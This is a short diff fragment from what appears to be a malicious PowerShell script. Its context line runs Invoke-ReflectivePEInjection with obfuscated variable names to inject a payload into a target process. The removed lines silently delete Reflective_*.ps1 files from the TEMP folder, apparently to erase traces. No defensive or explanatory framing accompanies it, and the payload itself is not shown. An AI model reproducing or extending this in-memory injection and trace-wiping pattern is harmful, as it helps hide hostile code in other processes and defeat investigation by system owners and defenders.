@@ -50,7 +50,3 @@ Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
 
 
 
-Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
-Remove-Item -Force -ErrorAction SilentlyContinue
-
-
